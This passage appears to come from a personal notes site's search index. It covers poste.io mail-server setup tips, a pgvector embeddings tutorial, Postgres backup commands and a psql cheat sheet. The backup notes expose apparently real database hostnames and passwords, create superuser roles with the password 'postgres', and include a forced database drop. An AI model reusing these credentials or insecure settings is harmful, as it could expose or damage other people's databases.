\ud83d\ude04 \ud83c\udf89</p> <p></p> <p>Para los que esten en la misma les dejo algunos consejos:</p> <ol> <li>Desactivar ClamAV: Si estan deployando en Digital Ocean van a tener que hacerlo porque se come el procesador. Basta con agregar DISABLE_CLAMAV=TRUE como variable de entorno en userdata.yaml.</li> </ol> <p>Se van a quedar sin el antivirus, pero si usan Linux o tienen sentido com\u00fan \ud83e\udd37\u200d\u2642\ufe0f</p> <ol> <li>Agregar SPF y DMARC:</li> <li>tudominio.com. TXT \"v=spf1 mx ~all\"</li> <li>_dmarc.tudominio.com. TXT \"v=DMARC1; p=none; rua=mailto:dmarc-reports@tudominio.com\"</li> <li>Agregar DKIM: Lo pueden sacar desde Virtual Domains &gt; tudominio.com &gt; DKIM key</li> <li>Usar un SMTP Relay: En mi caso los e-mails no se mandaban. Tambi\u00e9n hay gente que manda y a la otra persona le llega a spam. Para esto se puede configurar un relay en System Setting &gt; Email Processing &gt; Default SMTP Route. Pueden usar Sendgrid, Mailgun o cualquier otro \ud83d\udc4d</li> </ol> <p>No olviden validar el dominio asi no sale \"Enviado desde sendgrid.net\" o lo que sea. En el caso de Sendgrid se hace desde ac\u00e1.</p> <ol> <li>Opcional: Crear un CNAME para SMTP, POP, IMAP:</li> </ol> <p>Algunos clientes por defecto van a buscar, por ejemplo, smtp.tudominio.com, por eso es buena idea crear un CNAME:</p> <ul> <li>smtp.tudominio.com. CNAME mail.tudominio.com.</li> <li>pop.tudominio.com. CNAME mail.tudominio.com.</li> <li>imap.tudominio.com. CNAME mail.tudominio.com.</li> </ul> <p>Otras cosas que yo hice y quiz\u00e1 no son necesarias:</p> <ol> <li>Crear un volumen: Met\u00ed los datos en un volumen, asi si por alg\u00fan motivo tengo que regenerar el servidor de e-mail no pierdo los datos. \u00bfSe puede poner algo como prevent_destroy para evitar que a Terraform le pinte boletearlo?</li> <li>Elimin\u00e9 la creaci\u00f3n del dominio: Como ya tenia el dominio raiz generado de antes me fallaba porque intentaba regenerarlo.</li> <li>Puse el dominio raiz en una variable: Para m\u00e1s placer. (Y por el punto 7)</li> <li>Cambie la interpolaci\u00f3n de variables: En Terraform 0.12 ya no hace falta el \"${variable}\". Si es solo eso se puede poner la variable directamente y me ahorro el warning.</li> <li>Use la im\u00e1gen de Debian 10: \u00bfPorqu\u00e9? No hay porque. (Me gusta m\u00e1s nom\u00e1s)</li> </ol> <p>Como toda persona de bien hice los cambios con Terraform (Excepto puntos 3 y 4) \ud83d\udcaa Estan en un fork, por si alguno quiere chusmear o tomar algo lo puede hacer desde ac\u00e1:</p> <ul> <li>https://github.com/imcosta/peladonerd/tree/master/terraform/3</li> </ul> <p>Saludos</p> <p>Hi, I'm trying to use something similar to this, but with separated docker-compose.yml files like this:</p>"},{"location":"PosteMail/InstallDocker/#for-nginx-proxy-and-lets-encrypt","title":"For nginx-proxy and lets-encrypt","text":"<pre><code>version: \"3.8\"\nservices:\n  # nginx-proxy\n  nginx-proxy:\n    image: jwilder/nginx-proxy\n    container_name: MyProxy\n    restart: always\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - \"/var/run/docker.sock:/tmp/docker.sock:ro\"\n      - \"./certs:/etc/nginx/certs\"\n      - \"./vhost.d:/etc/nginx/vhost.d\"\n      - \"./html:/usr/share/nginx/html\"\n      - \"./conf.d:/etc/nginx/conf.d\"\n    networks:\n      - \"net\"\n  # lets-encrypt\n  letsencrypt-nginx-proxy-companion:\n    image: jrcs/letsencrypt-nginx-proxy-companion\n    container_name: lets-encrypt\n    depends_on:\n      - nginx-proxy\n    restart: always\n    environment:\n      - NGINX_DOCKER_GEN_CONTAINER=MyProxy\n      - NGINX_PROXY_CONTAINER=MyProxy\n    volumes:\n      - \"/var/run/docker.sock:/tmp/docker.sock:ro\"\n      - \"./certs:/etc/nginx/certs\"\n      - \"./vhost.d:/etc/nginx/vhost.d\"\n      - \"./html:/usr/share/nginx/html\"\n      - \"/var/run/docker.sock:/var/run/docker.sock:ro\"\n    networks:\n      - net\nnetworks:\n  net:\n    external: true\n</code></pre> <p>And for poste.io:</p> <pre><code>version: '3.8'\n\nservices:\n  mailserver:\n    image: analogic/poste.io:latest\n    container_name: mailserver\n    hostname: mail\n    domainname: johandroid.com\n    restart: unless-stopped\n    ports:\n      - \"25:25\"\n      - \"110:110\"\n      - \"143:143\"\n      - \"587:587\"\n      - \"993:993\"\n      - \"995:995\"\n      - \"4190:4190\"\n      - \"465:465\"\n    environment:\n      - LETSENCRYPT_EMAIL=info@johandroid.com\n      - LETSENCRYPT_HOST=mail.johandroid.com\n      - VIRTUAL_HOST=mail.johandroid.com,smtp.johandroid.com,imap.johandroid.com\n      - DISABLE_CLAMAV=TRUE\n      - HTTPS=OFF\n    volumes:\n      - \"/etc/localtime:/etc/localtime:ro\"\n      - \"~/nginx/nginx-proxy/html/.well-known:/opt/www/.well-known\"\n      - \"./data/mailserver:/data\"\n    networks:\n      - \"net\"\n\nnetworks:\n  net:\n    external: true\n</code></pre> <p>This is working nice and smooth, I can login into the admin or webclient, and even use thunderbird as mail client, I can send and recieve mail ... But, when I try to use the gmail app for android, it complains about the certificate, it says the issuer of certificate is poste and not my lets-encrypt certificate, actually the expiration date is Sep 17, 2020</p> <p>How can I make it use my certificates?</p> <p>Hi johandroid. I got the same problem. Link the letsencrypt certs from the nginx proxy to the poste.io container =&gt;</p> <pre><code>    volumes:\n      - NGINX_PROXY_PATH/ssl/certs/mail.YOUR_DOMAIN.com/key.pem:/data/ssl/server.key:ro\n      - NGINX_PROXY_PATH/ssl/certs/mail.YOUR_DOMAIN.com/fullchain.pem:/data/ssl/ca.crt:ro\n      - NGINX_PROXY_PATH/ssl/certs/mail.YOUR_DOMAIN.com/cert.pem:/data/ssl/server.crt:ro\n</code></pre> <p>=&gt; https://www.cloudrocket.at/posts/self-hosted-mail-server-with-poste.io-and-nginx/#the-tls-termination-problem</p> <p></p>"},{"location":"PosteMail/InstallDocker/#fedeaguilera-commented-on-jul-8-2022","title":"fedeaguilera commented on Jul 8, 2022","text":"<p>Hi johandroid. I got the same problem. Link the letsencrypt certs from the nginx proxy to the poste.io container =&gt;</p> <p><code>volumes:       - NGINX_PROXY_PATH/ssl/certs/mail.YOUR_DOMAIN.com/key.pem:/data/ssl/server.key:ro       - NGINX_PROXY_PATH/ssl/certs/mail.YOUR_DOMAIN.com/fullchain.pem:/data/ssl/ca.crt:ro       - NGINX_PROXY_PATH/ssl/certs/mail.YOUR_DOMAIN.com/cert.pem:/data/ssl/server.crt:ro</code></p> <p>=&gt; https://www.cloudrocket.at/posts/self-hosted-mail-server-with-poste.io-and-nginx/#the-tls-termination-problem</p> <p>hi guys. if you have a 2 domains. works only one certificate?</p> <pre><code>version: '3'\n\nservices:\n\n  mailserver:\n    image: analogic/poste.io\n    container_name: mailserver-leninnet.ni\n    restart: always\n    network_mode: \"host\"\n    expose:\n      - \"25\"\n      - \"8181\"\n      - \"4443\"\n      - \"110\"\n      - \"143\"\n      - \"465\"\n      - \"587\"\n      - \"993\"\n      - \"995\"\n    environment:\n      - TZ=America/Managua\n      - h=mail.leninnet.ni  # Direccion del servidor de mail hosting\n      - HTTP_PORT=8181\n      - HTTPS_PORT=4443\n      - DISABLE_CLAMAV=TRUE\n    volumes:\n      - /mnt/mail:/data\n</code></pre> <pre><code>version: '3.8'\n\nservices:\n  mailserver:\n    image: analogic/poste.io:latest\n    container_name: mailserver\n    hostname: mail\n    domainname: madolell.com\n    restart: unless-stopped\n    network_mode: host\n    expose: \n      - '80'\n      - '25'    # SMTPS - mostly processing incoming mails\n      - '465'    # SMTPS - mostly processing incoming mails\n      - '110'  #  POP3 - standard protocol for accessing mailbox, STARTTLS is required before client auth   \n      - '143'  #  IMAP - standard protocol for accessing mailbox, STARTTLS is required before client auth\n      - '443'  #  HTTPS - access to administration or webmail client                                \n      - '587'  #  MSA - SMTP port used primarily for email clients after STARTTLS and auth            \n      - '993'  #  IMAPS - alternative port for IMAP encrypted since connection                        \n      - '995'  #  POP3S - encrypted POP3 since connections\n    environment:\n      - h=mail.madolell.com\n      - LETSENCRYPT_EMAIL=info@madolell.com\n      - LETSENCRYPT_HOST=mail.madolell.com\n      - VIRTUAL_HOST=mail.madolell.com\n      - DISABLE_CLAMAV=TRUE\n      - HTTPS=ON\n    volumes:\n      - \"/etc/localtime:/etc/localtime:ro\"\n      - \"~/nginx/nginx-proxy/html/.well-known:/opt/www/.well-known\"\n      - \"./data/mailserver:/data\"\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/","title":"How to use PostgreSQL to store and query vector embeddings","text":"<p>#postgres#vectorembeddings#cosinesimilarity#semanticsearch</p> <p>Vector embeddings are powerful representations of data points in a high-dimensional space, and they are widely used in Natural Language Processing (NLP) and Machine Learning. Storing and efficiently querying these embeddings is crucial for building scalable and performant applications.</p> <p>In this blog post, I will explain how to use pgvector, a PostgreSQL extension, to store and query vector embeddings efficiently. All of the code for this article can be found in the companion GitHub repository.</p>"},{"location":"Postgres/EmbedingsVectors/#prerequisites","title":"Prerequisites","text":"<p>Here are the items that you need to be somewhat familiar with before continuing with this tutorial:</p> <ul> <li>Basic knowledge of Python and SQL (specifically PostgreSQL's SQL).</li> <li>psycopg2, PyTorch and Transformers installed in your Python environment.</li> <li>Docker installed on your system.</li> <li>Docker Compose also installed on your system.</li> </ul> <p>First, I'll explain how to setup a Postgres database with the <code>pgvector</code> extension using docker and docker-compose.</p>"},{"location":"Postgres/EmbedingsVectors/#setting-up-the-database","title":"Setting Up the Database","text":""},{"location":"Postgres/EmbedingsVectors/#step-1-create-a-dockerfile","title":"Step 1: Create a Dockerfile","text":"<p>In your project directory, create a file named <code>Dockerfile</code> and add the following content to it:</p> <pre><code># Use the official Postgres image as a base image\nFROM postgres:latest\n\n# Set environment variables for Postgres\nENV POSTGRES_USER=myuser\nENV POSTGRES_PASSWORD=mypassword\nENV POSTGRES_DB=mydb\n\n# Install the build dependencies\nUSER root\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    build-essential \\\n    git \\\n    postgresql-server-dev-all \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# Clone, build, and install the pgvector extension\nRUN cd /tmp \\\n    &amp;&amp; git clone --branch v0.5.0 https://github.com/pgvector/pgvector.git \\\n    &amp;&amp; cd pgvector \\\n    &amp;&amp; make \\\n    &amp;&amp; make install\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/#step-2-create-a-docker-composeyml-file","title":"Step 2: Create a docker-compose.yml File","text":"<p>In your project directory, create a file named <code>docker-compose.yml</code> and add the following content to it:</p> <pre><code>version: \"3\"\n\nservices:\n  postgres:\n    build: .\n    ports:\n      - \"5432:5432\"\n    volumes:\n      - ./data:/var/lib/postgresql/data\n      - ./init_pgvector.sql:/docker-entrypoint-initdb.d/init_pgvector.sql\n    environment:\n      POSTGRES_USER: myuser\n      POSTGRES_PASSWORD: mypassword\n      POSTGRES_DB: mydb\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/#step-3-create-initialization-sql-script","title":"Step 3: Create Initialization SQL Script","text":"<p>Next, create a file called <code>init_pgvector.sql</code> and add the following to it:</p> <pre><code>-- Install the extension we just compiled\n\nCREATE EXTENSION IF NOT EXISTS vector;\n\n/*\nFor simplicity, we are directly adding the content into this table as\na column containing text data. It could easily be a foreign key pointing to\nanother table instead that has the content you want to vectorize for\nsemantic search, just storing here the vectorized content in our \"items\" table.\n\n\"768\" dimensions for our vector embedding is critical - that is the\nnumber of dimensions our open source embeddings model output, for later in the\nblog post.\n*/\n\nCREATE TABLE items (id bigserial PRIMARY KEY, content TEXT, embedding vector(768));\n</code></pre> <p>This SQL script will be used in the next section about building and running the docker container.</p>"},{"location":"Postgres/EmbedingsVectors/#step-3-build-and-run-the-docker-container","title":"Step 3: Build and Run the Docker Container","text":"<p>Navigate to your project directory in the terminal and run the following command to build and run the Docker container using the Dockerfile and <code>docker-compose.yml</code> you just created:</p> <pre><code>docker compose up\n</code></pre> <p>With our pgvector extension compiled and loaded into our database, and our database up and accepting connections, let's move onto the Python app.</p>"},{"location":"Postgres/EmbedingsVectors/#creating-embeddings-with-transformers","title":"Creating Embeddings with Transformers","text":"<p>For the sake of keeping this blog post shorter, I won't cover in detail what vector embeddings are. I do offer a free newsletter, and I've written an introduction to vector embeddings that you are free to checkout - and then come back!</p> <p>Let's move on to how we are creating embeddings.</p>"},{"location":"Postgres/EmbedingsVectors/#introduction-to-embedding_util","title":"Introduction to embedding_util","text":"<p>The <code>embedding_util</code> module is how we are generating embeddings in this tutorial. This module leverages a transformer model, specifically from <code>thenlper/gte-base</code> (more info here), to transform textual data into meaningful, semantically rich vector representations (our vector embeddings).</p>"},{"location":"Postgres/EmbedingsVectors/#code-overview","title":"Code Overview","text":"<p>I'll share the code that we are using to create the vector embeddings in our <code>embedding_util.py</code> file, and then explain it.</p> <pre><code>import os\nimport json\nfrom transformers import AutoTokenizer, AutoModel\nimport torch\nimport torch.nn.functional as F\n\n# We won't have competing threads in this example app\nos.environ[\"TOKENIZERS_PARALLELISM\"] = \"false\"\n\n\n# Initialize tokenizer and model for GTE-base\ntokenizer = AutoTokenizer.from_pretrained('thenlper/gte-base')\nmodel = AutoModel.from_pretrained('thenlper/gte-base')\n\n\ndef average_pool(last_hidden_states: Tensor, attention_mask: Tensor) -&gt; Tensor:\n    last_hidden = last_hidden_states.masked_fill(\n        ~attention_mask[..., None].bool(), 0.0)\n    return last_hidden.sum(dim=1) / attention_mask.sum(dim=1)[..., None]\n\n\ndef generate_embeddings(text, metadata={}):\n    combined_text = \" \".join(\n        [text] + [v for k, v in metadata.items() if isinstance(v, str)])\n\n    inputs = tokenizer(combined_text, return_tensors='pt',\n                       max_length=512, truncation=True)\n    with torch.no_grad():\n        outputs = model(**inputs)\n\n    attention_mask = inputs['attention_mask']\n    embeddings = average_pool(outputs.last_hidden_state, attention_mask)\n\n    embeddings = F.normalize(embeddings, p=2, dim=1)\n\n    return json.dumps(embeddings.numpy().tolist()[0])\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/#1-importing-necessary-libraries","title":"1. Importing Necessary Libraries","text":"<p>We start by importing necessary libraries and modules, including <code>json</code> for serialization, <code>AutoTokenizer</code> and <code>AutoModel</code> from the transformers library for tokenization and model loading, <code>torch</code> from PyTorch for tensor operations, and <code>torch.nn.functional</code> for additional functionalities like normalization.</p>"},{"location":"Postgres/EmbedingsVectors/#2-setting-environment-variable","title":"2. Setting Environment Variable","text":"<pre><code>os.environ[\"TOKENIZERS_PARALLELISM\"] = \"false\"\n</code></pre> <p>This line disables tokenizers parallelism to prevent any threading issues in this example app.</p> <p>NOTE: If you are using this inside an asynchronous web framework like fastAPI, you'll want to set this to <code>\"true\"</code> instead.</p>"},{"location":"Postgres/EmbedingsVectors/#3-initializing-tokenizer-and-model","title":"3. Initializing Tokenizer and Model","text":"<pre><code>tokenizer = AutoTokenizer.from_pretrained('thenlper/gte-base')\nmodel = AutoModel.from_pretrained('thenlper/gte-base')\n</code></pre> <p>Here, we are initializing the tokenizer and model for <code>GTE-base</code>, enabling us to convert text into embeddings subsequently.</p>"},{"location":"Postgres/EmbedingsVectors/#4-average-pooling-function","title":"4. Average Pooling Function","text":"<pre><code>def average_pool(last_hidden_states: Tensor, attention_mask: Tensor) -&gt; Tensor:\n    last_hidden = last_hidden_states.masked_fill(\n        ~attention_mask[..., None].bool(), 0.0)\n    return last_hidden.sum(dim=1) / attention_mask.sum(dim=1)[..., None]\n</code></pre> <p>This function performs average pooling on the last hidden states of the transformer model, using the attention mask to handle padded tokens. It returns the average pooled tensor, which represents the semantic essence of the input text.</p>"},{"location":"Postgres/EmbedingsVectors/#5-embedding-generation-function","title":"5. Embedding Generation Function","text":"<pre><code>def generate_embeddings(text, metadata={}):\n    combined_text = \" \".join(\n        [text] + [v for k, v in metadata.items() if isinstance(v, str)])\n\n    inputs = tokenizer(combined_text, return_tensors='pt',\n                       max_length=512, truncation=True)\n    with torch.no_grad():\n        outputs = model(**inputs)\n\n    attention_mask = inputs['attention_mask']\n    embeddings = average_pool(outputs.last_hidden_state, attention_mask)\n\n    embeddings = F.normalize(embeddings, p=2, dim=1)\n\n    return json.dumps(embeddings.numpy().tolist()[0])\n</code></pre> <p>This is where the main action happens. This function takes in text and optional metadata, tokenizes the input, passes it through the transformer model, and obtains the last hidden states. It then applies the <code>average_pool</code> function to get the final embedding, normalizes it, and returns it as a JSON string, ready to be stored in the database.</p> <p>Understanding the embedding generation process is pivotal for implementing effective and efficient semantic searches. This module, powered by the transformers library, facilitates the creation of rich, meaningful vector representations of text, enabling nuanced similarity searches when integrated with <code>pgvector</code> and PostgreSQL.</p>"},{"location":"Postgres/EmbedingsVectors/#integration-with-postgresql-for-storage-and-querying-of-embeddings","title":"Integration with PostgreSQL for Storage and Querying of Embeddings","text":"<p>With the explanation of the code behind how we are creating the embeddings, let's move onto the core of our Python app. Here, in <code>app.py</code>, we consolidate all of our components to insert example sentences into our PostgreSQL database, and then execute a cosine similarity search using <code>pgvector</code> to rank and retrieve the most similar items to a given query.</p>"},{"location":"Postgres/EmbedingsVectors/#bringing-it-all-together-apppy","title":"Bringing it All Together: <code>app.py</code>","text":"<p>Now, I'll share the whole <code>app.py</code> file, then explain it part by part:</p> <pre><code>import psycopg2\nfrom embedding_util import generate_embeddings\n\ndef run():\n\n    # Establish a connection to the PostgreSQL database\n    conn = psycopg2.connect(\n        user=\"myuser\",\n        password=\"mypassword\",\n        host=\"localhost\",\n        port=5432,  # The port you exposed in docker-compose.yml\n        database=\"mydb\"\n    )\n\n    # Create a cursor to execute SQL commands\n    cur = conn.cursor()\n\n    try:\n        sentences = [\n            \"A group of vibrant parrots chatter loudly, sharing stories of their tropical adventures.\",\n            \"The mathematician found solace in numbers, deciphering the hidden patterns of the universe.\",\n            \"The robot, with its intricate circuitry and precise movements, assembles the devices swiftly.\",\n            \"The chef, with a sprinkle of spices and a dash of love, creates culinary masterpieces.\",\n            \"The ancient tree, with its gnarled branches and deep roots, whispers secrets of the past.\",\n            \"The detective, with keen observation and logical reasoning, unravels the intricate web of clues.\",\n            \"The sunset paints the sky with shades of orange, pink, and purple, reflecting on the calm sea.\",\n            \"In the dense forest, the howl of a lone wolf echoes, blending with the symphony of the night.\",\n            \"The dancer, with graceful moves and expressive gestures, tells a story without uttering a word.\",\n            \"In the quantum realm, particles flicker in and out of existence, dancing to the tunes of probability.\",\n        ]\n\n        # Insert sentences into the items table\n        for sentence in sentences:\n            embedding = generate_embeddings(sentence)\n            cur.execute(\n                \"INSERT INTO items (content, embedding) VALUES (%s, %s)\",\n                (sentence, embedding)\n            )\n\n        # Example query\n        query = \"Give me some content about the ocean\"\n        query_embedding = generate_embeddings(query)\n\n        # Perform a cosine similarity search\n        cur.execute(\n            \"\"\"SELECT id, content, 1 - (embedding &lt;=&gt; %s) AS cosine_similarity\n               FROM items\n               ORDER BY cosine_similarity DESC LIMIT 5\"\"\",\n            (query_embedding,)\n        )\n\n        # Fetch and print the result\n        print(\"Query:\", query)\n        print(\"Most similar sentences:\")\n        for row in cur.fetchall():\n            print(\n                f\"ID: {row[0]}, CONTENT: {row[1]}, Cosine Similarity: {row[2]}\")\n\n    except Exception as e:\n        print(\"Error executing query\", str(e))\n    finally:\n        # Close communication with the PostgreSQL database server\n        cur.close()\n        conn.close()\n\n# This check ensures that the function is only run when the script is executed directly, not when it's imported as a module.\nif __name__ == \"__main__\":\n    run()\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/#1-connection-setup","title":"1. Connection Setup","text":"<p>After importing dependencies, we need to establish a connection to our Postgres and create a cursor that we can use to execute queries with:</p> <pre><code>    # Establish a connection to the PostgreSQL database\n    conn = psycopg2.connect(\n        user=\"myuser\",\n        password=\"mypassword\",\n        host=\"localhost\",\n        port=5432,  # The port you exposed in docker-compose.yml\n        database=\"mydb\"\n    )\n\n    # Create a cursor to execute SQL commands\n    cur = conn.cursor()\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/#2-embedding-insertion","title":"2. Embedding Insertion","text":"<p>Iterating over a list of sentences, generating their corresponding embeddings, and inserting them into the <code>items</code> table in the database, inside the <code>try..except</code> block:</p> <pre><code>sentences = [\n    \"A group of vibrant parrots chatter loudly, sharing stories of their tropical adventures.\",\n    \"The mathematician found solace in numbers, deciphering the hidden patterns of the universe.\",\n    \"The robot, with its intricate circuitry and precise movements, assembles the devices swiftly.\",\n    \"The chef, with a sprinkle of spices and a dash of love, creates culinary masterpieces.\",\n    \"The ancient tree, with its gnarled branches and deep roots, whispers secrets of the past.\",\n    \"The detective, with keen observation and logical reasoning, unravels the intricate web of clues.\",\n    \"The sunset paints the sky with shades of orange, pink, and purple, reflecting on the calm sea.\",\n    \"In the dense forest, the howl of a lone wolf echoes, blending with the symphony of the night.\",\n    \"The dancer, with graceful moves and expressive gestures, tells a story without uttering a word.\",\n    \"In the quantum realm, particles flicker in and out of existence, dancing to the tunes of probability.\",\n]\n\n# Insert sentences into the items table\nfor sentence in sentences:\n    embedding = generate_embeddings(sentence)\n    cur.execute(\n        \"INSERT INTO items (content, embedding) VALUES (%s, %s)\",\n        (sentence, embedding)\n    )\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/#3-embedding-retrieval-and-similarity-search","title":"3. Embedding Retrieval and Similarity Search","text":"<p>Creating an embedding for a sample query and leveraging the <code>&lt;=&gt;</code> operator provided by <code>pgvector</code> allows us to perform a cosine similarity search.</p> <p>It is crucial to note that <code>pgvector</code> actually calculates the cosine distance, which is different from cosine similarity.</p> <p>Cosine distance measures the cosine of the angle between two non-zero vectors, whereas cosine similarity measures the cosine of the angle between two vectors, projecting the amount they overlap. Here's another explanation of cosine distance and cosine similarity.</p> <p>To obtain the cosine similarity from the cosine distance calculated by <code>pgvector</code>, we subtract the cosine distance from 1, returning results ordered by similarity, as illustrated below:</p> <pre><code>        # Example query\n        query = \"Give me some content about the ocean\"\n        query_embedding = generate_embeddings(query)\n\n        # Perform a cosine similarity search\n        cur.execute(\n            \"\"\"SELECT id, content, 1 - (embedding &lt;=&gt; %s) AS cosine_similarity\n               FROM items\n               ORDER BY cosine_similarity DESC LIMIT 5\"\"\",\n            (query_embedding,)\n        )\n\n        # Fetch and print the result\n        print(\"Query:\", query)\n        print(\"Most similar sentences:\")\n        for row in cur.fetchall():\n            print(\n                f\"ID: {row[0]}, CONTENT: {row[1]}, Cosine Similarity: {row[2]}\")\n</code></pre> <p>Our final output logged to the console should look something like this:</p> <pre><code>Query: Give me some content about the ocean\nMost similar sentences:\nID: 7, CONTENT: The sunset paints the sky with shades of orange, pink, and purple, reflecting on the calm sea., Cosine Similarity: 0.8009044169301547\nID: 5, CONTENT: The ancient tree, with its gnarled branches and deep roots, whispers secrets of the past., Cosine Similarity: 0.760971262397107\nID: 1, CONTENT: A group of vibrant parrots chatter loudly, sharing stories of their tropical adventures., Cosine Similarity: 0.7582434704013556\nID: 8, CONTENT: In the dense forest, the howl of a lone wolf echoes, blending with the symphony of the night., Cosine Similarity: 0.7446566376294829\nID: 2, CONTENT: The mathematician found solace in numbers, deciphering the hidden patterns of the universe., Cosine Similarity: 0.7399669003526144\n</code></pre>"},{"location":"Postgres/EmbedingsVectors/#conclusion","title":"Conclusion","text":"<p>This blog post illustrated how to efficiently store and query vector embeddings in PostgreSQL using pgvector, opening up advanced possibilities in semantic search and analysis for Natural Language Processing and Machine Learning.</p> <p>The companion code repository, with all of the code explained in this tutorial in one place, can be found here.</p>"},{"location":"Postgres/PostgresBkp/","title":"PostgresBkp","text":""},{"location":"Postgres/PostgresBkp/#backup","title":"Backup","text":"<pre><code>#let's create a backup from remote postgresql database using pg_dump:\n#\n# pg_dump -h [host address] -Fc -o -U [database user] &lt;database name&gt; &gt; [dump file]\n#\n#later it could be restored at the same remote server using:\n#\n# sudo -u postgres pg_restore -C mydb_backup.dump\n#\n#Ex:\n\npg_dump -h 67.8.78.10 -p 5432 -Fc -o -U myuser mydb &gt; mydb_backup.dump\n\npg_restore -C mydb_backup.dump\n\nPGPASSWORD=peaceful_cartwright pg_dump -h db.carti3r.tk -p 9955 -Fc -O -U postgres alg_database &gt; ./bkp.dump\n\n\n#complete (all databases and objects)\n\npg_dumpall -U myuser -h 67.8.78.10 -p 5432 --clean --file=mydb_backup.dump\n\n\n#restore from pg_dumpall --clean:\n\npsql -f mydb_backup.dump postgres #it doesn't matter which db you select here\n</code></pre> <pre><code>docker exec -t &lt;your-postgres-container-id&gt; pg_dumpall -c -U postgres &gt; dump_`date +%d-%m-%Y\"_\"%H_%M_%S`.sql\n</code></pre> <p>Restaurar</p> <pre><code>cat your_dump.sql | docker exec -i &lt;your-postgres-container-id&gt; psql -U myuser\n</code></pre> <pre><code>psql -h mybts-db.cjeketu2j07o.us-east-2.rds.amazonaws.com -U mybtsadmin dev\n\nchaRmandeR.0905\n\nGRANT ALL ON schema public TO mybtsadmin;\n\nGRANT USAGE ON SCHEMA public TO mybtsadmin;\n\nDROP DATABASE mydb WITH (FORCE);\n\nCREATE ROLE platform_prod WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD 'postgres';\n\nCREATE ROLE user_platform_prod WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD 'postgres';\n</code></pre> <pre><code>#! /bin/bash\n\npg_dump -h my.host.com -p 1234 -U my_user my_database &gt; my_dump.sql\n\npg_restore -h another.host.com -p 4321 -U another_user -d another_database my_dump.sql\nPGPASSWORD=peaceful_cartwright pg_restore -h db -p 5555 -U postgres -d alg_database ./alg_database.sql\n</code></pre>"},{"location":"Postgres/commands2/","title":"Commands2","text":""},{"location":"Postgres/commands2/#1-connect-to-postgresql-database","title":"1) Connect to PostgreSQL database","text":"<p>The following command connects to a database under a specific user. After pressing <code>Enter</code> PostgreSQL will ask for the password of the user.</p> <pre><code>psql -d database -U  user -W\nCode language: SQL (Structured Query Language) (sql)\n</code></pre> <p>For example, to connect to <code>dvdrental</code> database under <code>postgres</code> user, you use the following command:</p> <pre><code>C:\\Program Files\\PostgreSQL\\9.5\\bin&gt;psql -d dvdrental -U postgres -W\nPassword for user postgres:\ndvdrental=#Code language: SQL (Structured Query Language) (sql)\n</code></pre> <p>If you want to connect to a database that resides on another host, you add the -h option as follows:</p> <pre><code>psql -h host -d database -U user -WCode language: SQL (Structured Query Language) (sql)\n</code></pre> <p>In case you want to use SSL mode for the connection, just specify it as shown in the following command:</p> <pre><code>psql -U user -h host \"dbname=db sslmode=require\"Code language: SQL (Structured Query Language) (sql)\n</code></pre>"},{"location":"Postgres/commands2/#2-switch-connection-to-a-new-database","title":"2) Switch connection to a new database","text":"<p>Once you are connected to a database, you can switch the connection to a new database under a user specified by <code>user</code>. The previous connection will be closed. If you omit the <code>user</code> parameter, the current <code>user</code> is assumed.</p> <pre><code>\\c dbname username\n</code></pre> <p>The following command connects to <code>dvdrental</code> database under <code>postgres</code> user:</p> <pre><code>postgres=# \\c dvdrental\nYou are now connected to database \"dvdrental\" as user \"postgres\".\ndvdrental\n</code></pre>"},{"location":"Postgres/commands2/#3-list-available-databases","title":"3) List available databases","text":"<p>To list all databases in the current PostgreSQL database server, you use <code>\\l</code> command:</p> <pre><code>\\l\n</code></pre>"},{"location":"Postgres/commands2/#4-list-available-tables","title":"4) List available tables","text":"<p>To list all tables in the current database, you use <code>\\dt</code> command:</p> <pre><code>\\dt\n</code></pre> <p>Note that this command shows the only table in the currently connected database.</p>"},{"location":"Postgres/commands2/#5-describe-a-table","title":"5) Describe a table","text":"<p>To describe a table such as a column, type, modifiers of columns, etc., you use the following command:</p> <pre><code>\\d table_name\n</code></pre>"},{"location":"Postgres/commands2/#6-list-available-schema","title":"6) List available schema","text":"<p>To list all schemas of the currently connected database, you use the <code>\\dn</code> command.</p> <pre><code>\\dn\n</code></pre>"},{"location":"Postgres/commands2/#7-list-available-functions","title":"7) List available functions","text":"<p>To list available functions in the current database, you use the <code>\\df</code> command.</p> <pre><code>\\df\n</code></pre>"},{"location":"Postgres/commands2/#8-list-available-views","title":"8) List available views","text":"<p>To list available views in the current database, you use the <code>\\dv</code> command.</p> <pre><code>\\dv\n</code></pre>"},{"location":"Postgres/commands2/#9-list-users-and-their-roles","title":"9) List users and their roles","text":"<p>To list all users and their assign roles, you use <code>\\du</code> command:</p> <pre><code>\\du\n</code></pre>"},{"location":"Postgres/commands2/#10-execute-the-previous-command","title":"10) Execute the previous command","text":"<p>To retrieve the current version of PostgreSQL server, you use the <code>version()</code> function as follows:</p> <pre><code>SELECT version();\n</code></pre> <p>Now, you want to save time typing the previous command again, you can use <code>\\g</code> command to execute the previous command:</p> <pre><code>\\g\n</code></pre> <p>psql executes the previous command again, which is the SELECT statement,.</p>"},{"location":"Postgres/commands2/#11-command-history","title":"11) Command history","text":"<p>To display command history, you use the <code>\\s</code> command.</p> <pre><code>\\s\n</code></pre> <p>If you want to save the command history to a file, you need to specify the file name followed the <code>\\s</code> command as follows:</p> <pre><code>\\s filename\n</code></pre>"},{"location":"Postgres/commands2/#12-execute-psql-commands-from-a-file","title":"12) Execute psql commands from a file","text":"<p>In case you want to execute psql commands from a file, you use <code>\\i</code> command as follows:</p> <pre><code>\\i filename\n</code></pre>"},{"location":"Postgres/commands2/#13-get-help-on-psql-commands","title":"13) Get help on psql commands","text":"<p>To know all available psql commands, you use the <code>\\?</code> command.</p> <pre><code>\\?\n</code></pre> <p>To get help on specific PostgreSQL statement, you use the <code>\\h</code> command.</p> <p>For example, if you want to know detailed information on ALTER TABLE statement, you use the following command:</p> <pre><code>\\h ALTER TABLE\n</code></pre>"},{"location":"Postgres/commands2/#14-turn-on-query-execution-time","title":"14) Turn on query execution 